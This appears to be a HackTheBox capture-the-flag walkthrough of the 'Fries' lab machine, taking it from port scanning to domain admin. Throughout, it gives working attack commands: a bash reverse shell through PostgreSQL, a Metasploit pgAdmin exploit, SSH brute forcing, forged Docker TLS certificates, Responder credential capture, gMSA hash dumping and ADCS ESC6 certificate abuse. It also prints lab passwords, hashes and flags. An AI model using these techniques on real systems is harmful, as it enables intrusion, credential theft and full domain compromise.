# HackTheBox — Fries (Hard Windows) — Complete Detailed Walkthrough

**Difficulty:** Hard | **OS:** Windows Server 2019 DC + Linux Docker Host | **Domain:** fries.htb

---

## Attack Chain Overview

```
Port Scan → Subdomain Discovery → Gitea Creds Leak → PgAdmin Login (d.cooper)
→ PostgreSQL RCE → CVE-2025-2945 Meterpreter → Env Password Reuse
→ SSH as svc → NFS Weak Export → Docker TLS CA Abuse
→ LDAP Redirect (Responder) → svc_infra Cleartext Creds
→ BloodHound → ReadMSAPassword → gMSA Hash Dump
→ ADCS ESC6 + ESC16 → Cert Abuse → Administrator Hash → Domain Admin
```

---

## Initial Credentials (HTB Provided)

```
User: d.cooper@fries.htb
Pass: D4LE11maan!!
```

> These credentials fail for SMB, WinRM, and Kerberos — they are only valid for web applications.
> 

---

## 1. Reconnaissance

### Full Port Scan

```bash
nmap -sS -p- --min-rate 10000 10.129.244.72 -oN nmap_initial.txt
```

### Service Version Scan

```bash
nmap -sC -sV -p 22,53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985 10.129.244.72
```

**Output:**

```
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.18.0 (Ubuntu)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb)
443/tcp   open  ssl/http      nginx 1.18.0 (Ubuntu)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
Service Info: Host: DC01; OSs: Linux, Windows; Domain: fries.htb
```

> **Why:** We see port 22 (SSH on Linux host), standard AD ports (88, 389, 445, 5985), and web services on 80/443. This confirms a hybrid environment — Linux web host proxying to a Windows DC.
> 

### Hosts File

```bash
echo "10.129.244.72 fries.htb dc01.fries.htb" | sudo tee -a /etc/hosts
```

---

## 2. Subdomain Discovery (FFUF)

```bash
ffuf -c -u "http://fries.htb" -H "Host: FUZZ.fries.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 154
```

**Output:**

```
code    [Status: 200, Size: 13591, Words: 1048, Lines: 272, Duration: 557ms]
```

> **Why:** We filter by size 154 (default nginx response) to find real virtual hosts. Discovered `code.fries.htb` — a Gitea instance.
> 

```bash
echo "10.129.244.72 code.fries.htb db-mgmt05.fries.htb pwm.fries.htb" | sudo tee -a /etc/hosts
```

---

## 3. Gitea Recon → Database Credentials

Browse to `http://code.fries.htb` — login with HTB provided creds:

```
d.cooper@fries.htb / D4LE11maan!!
```

Clone the repository and search git history for credentials:

```bash
git clone http://code.fries.htb/dale/fries.htb.git
cd fries.htb
git log -p --all | grep -i "password\|secret\|DATABASE\|KEY\|token\|passwd" | head -50
```

**Output (from git history):**

```
DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a
```

> **Why:** Developers often commit credentials accidentally. `git log -p --all` shows ALL changes including deleted lines, revealing passwords that were removed from current code.
> 

The README also references: `http://db-mgmt05.fries.htb` — a pgAdmin interface.

---

## 4. PgAdmin Access → PostgreSQL RCE

### Login to pgAdmin

Browse to `http://db-mgmt05.fries.htb`

```
Username: d.cooper@fries.htb
Password: D4LE11maan!!
```

> **Why:** Password reuse — the HTB creds work here even though they failed on AD services.
> 

### Connect to PostgreSQL

In pgAdmin, add a new server:

```
Host: 172.18.0.3
Port: 5432
Database: ps_db
Username: root
Password: PsqLR00tpaSS11
```

![Screenshot 2026-04-27 113302.png](attachment:71cf615c-4e94-4374-8f3a-e5ae7bc9bb0a:Screenshot_2026-04-27_113302.png)

### Test Command Execution via SQL

Open the Query Tool and run:

```sql
-- Directory listing
SELECT pg_ls_dir('/');

-- File read
SELECT pg_read_file('/etc/passwd');
```

![Screenshot 2026-04-27 114618.png](attachment:84a28e6c-44fa-4868-99f0-27f0830f076e:Screenshot_2026-04-27_114618.png)

**Output:**

```
root:x:0:0:root:/root:/bin/bash
...
```

> **Why:** The PostgreSQL `root` user has `pg_read_file` and `COPY FROM PROGRAM` privileges, allowing OS-level command execution.
> 

### Reverse Shell

Start listener on Kali:

```bash
nc -lvnp 4444
```

Execute in pgAdmin Query Tool:

```sql
CREATE TABLE IF NOT EXISTS cmd_test(result text);
COPY cmd_test FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.66/4444 0>&1"';
SELECT * FROM cmd_test;
```

![Screenshot 2026-04-27 115053.png](attachment:5628f238-959a-479a-8c34-f56e136debad:Screenshot_2026-04-27_115053.png)

**Shell received:**

```
postgres@858fdf51af59:~/data$ whoami
postgres
```

### Stabilize Shell

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 columns 200
```

---

## 5. CVE-2025-2945 — pgAdmin Authenticated RCE (Meterpreter)

![Screenshot 2026-04-27 103002.png](attachment:9e79b3e9-8227-4dc9-a1b0-a02e5727c025:Screenshot_2026-04-27_103002.png)

pgAdmin version 9.1.0 is vulnerable to CVE-2025-2945 — an authenticated RCE via Python `eval()` in the query tool download endpoint.

![Screenshot 2026-04-27 103314.png](attachment:ec55c7dc-acd5-4dc1-b221-d2fcc6b1ea41:Screenshot_2026-04-27_103314.png)

```bash
msfconsole -q
msf > use exploit/multi/http/pgadmin_query_tool_authenticated
msf > set USERNAME d.cooper@fries.htb
msf > set PASSWORD D4LE11maan!!
msf > set DB_USER root
msf > set DB_PASS PsqLR00tpaSS11
msf > set DB_NAME ps_db
msf > set RHOSTS db-mgmt05.fries.htb
msf > set VHOST db-mgmt05.fries.htb
msf > set LHOST 10.10.14.66
msf > run
```

**Output:**

```
[*] Started reverse TCP handler on 10.10.14.66:4444
[+] The target appears to be vulnerable. pgAdmin version 9.1.0 is affected
[+] Successfully authenticated to pgAdmin
[+] Successfully initialized sqleditor
[*] Sending stage (23404 bytes) to 10.129.244.72
[*] Meterpreter session 1 opened (10.10.14.66:4444 → 10.129.244.72:49816)

meterpreter > getuid
Server username: pgadmin
```

---

## 6. Password Reuse → SSH as svc

Inside the pgAdmin container, dump environment variables:

```bash
cat /proc/self/environ | tr '\0' '\n'
```

**Output:**

```
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
SECRET_KEY=1Mmv-sf5sOkJWFFATAIjb4zix4-_WI6Y9r_rA3cfZf0=
```

> **Why:** Container environment variables frequently store application secrets. This password may be reused on other services.
> 

Create a user wordlist and brute-force SSH:

```bash
cat > users.txt << EOF
admin
svc
svc_infra
infra
root
fries
dale
cooper
d.cooper
EOF

hydra -L users.txt -p 'Friesf00Ds2025!!' ssh://10.129.244.72 -t 64 -I
```

**Output:**

```
[22][ssh] host: 10.129.244.72   login: svc   password: Friesf00Ds2025!!
1 of 1 target successfully completed, 1 valid password found
```

SSH in:

```bash
ssh svc@10.129.244.72
```

```
svc@web:~$ whoami
svc
```

---

## 7. NFS Weak Export → Docker TLS CA Abuse

### Check NFS Exports

```bash
svc@web:~$ showmount -e
```

**Output:**

```
Export list for web:
/srv/web.fries.htb *
```

```bash
svc@web:~$ ls -la /srv/web.fries.htb
```

**Output:**

```
drwxrwx--- 2 root infra managers 4096 May 26  2025 certs
drwxrwxrwx 2 root root           4096 May 31  2025 shared
drwxr----- 5 svc  svc            4096 Jun  7  2025 webroot
```

> **Why:** The NFS export is wildcard (*) with no `root_squash`, meaning we can connect as any UID. The `certs` folder contains Docker TLS certificates.
> 

### Setup Tunnel and NFS Tools (Kali)

```bash
# Pivot into internal network
sshuttle -r svc@10.129.244.72 -N

# Install NFS security tooling
pipx install git+https://github.com/hvs-consulting/nfs-security-tooling.git

# Analyze NFS export
nfs_analyze 192.168.100.2 --check-no-root-squash
```

**Output (key parts):**

```
Available Exports:
/srv/web.fries.htb  *(wildcard)  sys

no_root_squash: DISABLED   ← vulnerable!

Escape successful, root directory listing:
lib64 mnt sys etc proc lib snap lost+found...

Content of /etc/shadow:
root:$y$j9T$yqbmFwMbHh7qoaRaY3jx..$FMFv9upB...
svc:$y$j9T$Y7j3MSqEJTcNTqSSVJRS2.$h0AFlCXKB9...
```

> **Why:** NFS trusts client-reported UIDs. With `--fake-uid` we can mount as any user including root, bypassing permission checks.
> 

### Mount NFS and Steal Certs

```bash
mkdir /tmp/nfs_mount
fuse_nfs --export /srv/web.fries.htb --fake-uid --allow-write /tmp/nfs_mount 192.168.100.2

ls -la /tmp/nfs_mount/certs
```

**Output:**

```
-rw-r--r-- 1 root 59605603 1708 Apr 27 2026 ca-key.pem
-rw-r--r-- 1 root 59605603 1111 Apr 27 2026 ca.pem
-rw-r--r-- 1 root 59605603 1115 Apr 27 2026 server-cert.pem
-rw-r--r-- 1 root 59605603  940 Apr 27 2026 server.csr
-rw-r--r-- 1 root 59605603 1704 Apr 27 2026 server-key.pem
```

```bash
cp /tmp/nfs_mount/certs/* ~/AD-PROJECT/fries/
```

### Abuse Docker TLS with Forged Root Certificate

The Docker daemon is listening on TCP with TLS. We have the CA key, so we can sign our own certificate as `CN=root`:

```bash
# Tunnel Docker port
ssh svc@10.129.244.72 -L 2376:127.0.0.1:2376 -N &

# Generate root certificate signed by the CA
openssl genrsa -out root-key.pem 4096
openssl req -new -key root-key.pem -out root.csr -subj "/CN=root"
openssl x509 -req -in root.csr \
  -CA ca.pem -CAkey ca-key.pem \
  -CAcreateserial \
  -out root-cert.pem -days 365
```

**Output:**

```
Certificate request self-signature ok
subject=CN=root
```

```bash
# List Docker containers
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  -H=tcp://127.0.0.1:2376 ps
```

**Output:**

```
CONTAINER ID   IMAGE                   NAMES
f427ecaa3bdd   pwm/pwm-webapp:latest   pwm
cb46692a4590   dpage/pgadmin4:9.1.0    pgadmin4
bfe752a26695   fries-web               web
858fdf51af59   postgres:16             postgres
b916aad508e2   gitea/gitea:1.22.6      gitea
```

> **Why:** Docker TLS authenticates by certificate CN. By forging a cert with `CN=root` signed by the CA we stole, we get full Docker API access.
> 

### Enter PWM Container

```bash
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  -H=tcp://127.0.0.1:2376 exec -it f427ecaa3bdd /bin/bash

root@f427ecaa3bdd:/# whoami
root
```

---

## 8. LDAP Credential Capture via Responder

### Inspect PWM Configuration

```bash
root@f427ecaa3bdd:/# cat /config/PwmConfiguration.xml | grep "ldap"
```

**Key output:**

```xml
<setting key="ldap.serverUrls" profile="default">
    <value>ldaps://dc01.fries.htb:636</value>
...
<value>{"type":"ldapUser","ldapBase":"CN=svc_infra,CN=Users,DC=fries,DC=htb"}</value>
```

> **Why:** PWM (Password Manager) uses `svc_infra` as its LDAP bind account. If we redirect its LDAP connection to our machine, it will send us the credentials in cleartext.
> 

### Redirect LDAP to Attacker(Go to the pwm web and login with creds of svc)

![Screenshot 2026-04-27 133716.png](attachment:824538c9-29b4-4a06-9992-f03f322273f6:Screenshot_2026-04-27_133716.png)

### Start Responder on Kali

```bash
sudo responder -I tun0 -wdv
```

**Output (captured credentials):**

```
[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.129.244.72
[LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
[LDAP] Cleartext Password : m6tneOMAh5p0wQ0d
```

Validate credentials:

```bash
netexec ldap 10.129.244.72 -u svc_infra -p 'm6tneOMAh5p0wQ0d'
# OUTPUT: [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d (Pwn3d!)
```

---

## 9. BloodHound → ReadMSAPassword → gMSA Hash

### Collect BloodHound Data

```bash
bloodhound-ce-python -d 'fries.htb' -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' \
  -ns 10.129.244.72 -c All --zip
```

> **Why:** BloodHound maps AD relationships. It reveals `svc_infra` has `ReadMSAPassword` rights on the `gMSA_CA_prod$` Group Managed Service Account.
> 

![image.png](attachment:653e6e89-3289-4cd5-8b70-6fcd26ac41d2:image.png)

### Dump gMSA Password

```bash
python gMSADumper.py -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' -d 'fries.htb'
```

**Output:**

```
Users or groups who can read password for gMSA_CA_prod$:
 > svc_infra
gMSA_CA_prod$:::f6118585da63c6810f795676f8ddc87d
gMSA_CA_prod$:aes256-cts-hmac-sha1-96:e88d13f5ef571d98587c27c52522f162239e9182...
```

> **Why:** Group Managed Service Accounts have passwords automatically managed by AD. Principals with `ReadMSAPassword` can retrieve the current NT hash — no cracking needed.
> 

### WinRM as gMSA

```bash
evil-winrm -i fries.htb -u 'gMSA_CA_prod$' -H 'f6118585da63c6810f795676f8ddc87d'
```

```
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> whoami
fries\gmsa_ca_prod$
```

---

## 10. ADCS Enumeration

```bash
certipy-ad find -u 'gMSA_CA_prod$' -hashes 'f6118585da63c6810f795676f8ddc87d' \
  -dc-ip 10.129.244.72 -vulnerable
```

Also enumerate from WinRM:

```powershell
.\Certify.exe cas
```

**Key findings:**

```
Enterprise CA Name : fries-DC01-CA
DNS Hostname       : DC01.fries.htb
ManageCA rights    : FRIES\gMSA_CA_prod$  ← we have ManageCA!
Enrollment Agent Restrictions : None
Enabled Templates  : User, Machine, SubCA, Administrator...
```

> **Why:** `gMSA_CA_prod$` has `ManageCA` rights, meaning it can modify CA configuration — enabling us to set dangerous flags.
> 

---

## 11. ADCS ESC6 — Enable EDITF_ATTRIBUTESUBJECTALTNAME2

This flag allows any enrollee to specify an arbitrary Subject Alternative Name (SAN) in their certificate request, including UPNs of other users like Administrator.

### Set the Flag via COM Object (WinRM)

```powershell
$CA = New-Object -ComObject CertificateAuthority.Admin
$Config = "DC01.fries.htb\fries-DC01-CA"

# Current value: 1114446, add 262144 (EDITF_ATTRIBUTESUBJECTALTNAME2)
$current = 1114446
$new = $current -bor 262144  # = 1376590

# Split node path and entry name into separate arguments
$CA.SetConfigEntry(
    $Config,
    "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy",
    "EditFlags",
    $new
)

Restart-Service certsvc -Force
```

### Verify

```powershell
certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\EditFlags
```

**Output:**

```
EditFlags REG_DWORD = 15014e (1376590)
    EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)  ← SET!
```

Certify also confirms:

```
[!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify SANs!
```

---

## 12. Request Administrator Certificate (ESC6 Exploitation)

### Sync Time First

```bash
sudo ntpdate fries.htb
# OUTPUT: time stepped by 25207.428245
```

> **Why:** Kerberos authentication requires clock skew < 5 minutes. Without time sync, cert auth will fail with KRB_AP_ERR_SKEW.
> 

### Request Certificate as Administrator

Using `svc_infra` (Domain User with Enroll rights on User template):

```bash
certipy-ad req -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ0d' \
  -dc-ip 10.129.244.72 \
  -ca 'fries-DC01-CA' \
  -template User \
  -upn 'administrator@fries.htb'
```

**Output:**

```
[*] Requesting certificate via RPC
[*] Request ID is 42
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fries.htb'
[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-3601'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

> **Why:** ESC6 is active — the CA now accepts our requested UPN (`administrator@fries.htb`) and embeds it in the certificate. The certificate object SID (3601) is `svc_infra`'s SID, which causes a mismatch issue on patched DCs (ESC16 is needed to bypass this, but the machine accepts it directly).
> 

---

## 13. Authenticate with Certificate → Get Administrator Hash

```bash
certipy-ad auth -pfx administrator.pfx \
  -dc-ip 10.129.244.72 \
  -domain fries.htb \
  -username administrator
```

**Output:**

```
[*] Certificate identities:
[*]     SAN UPN: 'administrator@fries.htb'
[*] Using principal: 'administrator@fries.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Got hash for 'administrator@fries.htb':
    aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
```

> **Why:** PKINIT (Public Key Cryptography for Initial Authentication) allows us to use the certificate to get a Kerberos TGT as Administrator. Certipy extracts the NT hash from the PAC in the TGT.
> 

---

## 14. Domain Admin — Pass the Hash

```bash
evil-winrm -i 10.129.244.72 -u 'Administrator' -H 'a773cb05d79273299a684a23ede56748'
```

**Output:**

```
Evil-WinRM shell v3.7
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### Get the Flags

```powershell
cd C:\Users\Administrator\Desktop
dir
type user.txt
type root.txt
```

**Output:**

```
Mode                LastWriteTime         Length Name
-ar---        4/27/2026   1:56 PM             34 root.txt
-ar---        4/27/2026   1:56 PM             34 user.txt

user.txt: 20040e0a3b5b9e663a33580d791615a1
root.txt: 1b7444a4d4e9cfc99ce22ef1e1e4b7e5
```

**Domain Admin achieved!**

---

## Summary of Vulnerabilities Exploited

| # | Vulnerability | Impact |
| --- | --- | --- |
| 1 | Gitea commit history exposes DB credentials | PostgreSQL access |
| 2 | PostgreSQL COPY FROM PROGRAM (RCE) | Container shell as postgres |
| 3 | CVE-2025-2945 pgAdmin authenticated RCE | Shell as pgadmin |
| 4 | Password reuse (env var) | SSH as svc |
| 5 | NFS no_root_squash + wildcard export | Docker TLS cert theft |
| 6 | Docker TLS CA key exposure | Full Docker API access |
| 7 | PWM LDAP redirect + Responder | Cleartext svc_infra creds |
| 8 | ReadMSAPassword on gMSA | gMSA NT hash |
| 9 | ADCS ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2) | Certificate as Administrator |
| 10 | PKINIT certificate authentication | Administrator NT hash |

---

## Tools Used

- `nmap` — Port scanning
- `ffuf` — Subdomain enumeration
- `git` — Repository credential extraction
- `msfconsole` — CVE-2025-2945 exploitation
- `hydra` — SSH brute force
- `sshuttle` — Network pivoting
- `nfs_analyze` / `fuse_nfs` — NFS UID spoofing
- `openssl` — Docker TLS cert forgery
- `docker` — Container access
- `responder` — LDAP cleartext capture
- `bloodhound-ce-python` — AD enumeration
- `gMSADumper` — gMSA password extraction
- `evil-winrm` — WinRM shell
- `Certify.exe` — ADCS enumeration
- `certipy-ad` — Certificate request and authentication
- `ntpdate` — Kerberos time sync
